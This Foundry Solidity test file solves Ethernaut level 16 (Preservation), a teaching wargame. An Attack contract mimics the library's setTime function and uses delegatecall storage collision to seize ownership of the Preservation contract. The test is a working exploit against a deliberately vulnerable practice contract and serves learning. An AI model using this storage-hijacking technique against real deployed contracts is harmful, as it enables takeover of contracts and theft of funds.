// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Preservation} from "../../src/ethernaut/level_16/Preservation.sol";
import {LibraryContract} from "../../src/ethernaut/level_16/Preservation.sol";

contract Attack {
    uint256 storedTime;
    address public newOwner;
    address public owner;

    // imitates the setTime function of the libraryContract but rather than set time
    // sets storedTime to a new owner address
    function setTime(uint256 _time) public {
        owner = 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf;
    }
}

contract PreservationTest is Test {
    using stdStorage for StdStorage;

    Preservation public pr;
    LibraryContract public timezone1;
    LibraryContract public timezone2;
    Attack public attack;
    address public alice;

    function setUp() public {
        // deploy the library contracts
        timezone1 = new LibraryContract();
        timezone2 = new LibraryContract();

        alice = vm.addr(1);
        pr = new Preservation(address(timezone1), address(timezone2));
        attack = new Attack();
    }

    function testAttack() public {
        // sets variable timeZone1Library in pr contracts to the address of the attack contract
        // address are 20 bytes long; uint160 can hold 20 bytes value max (160 bits / 8)
        pr.setSecondTime(uint160(address(attack)));

        assertEq(address(attack), pr.timeZone1Library());

        // the delegatecall is sent to the attack contract which sets the owner variable
        // in Preservation to alice's address
        pr.setFirstTime(1);

        assertEq(alice, pr.owner());
    }
}
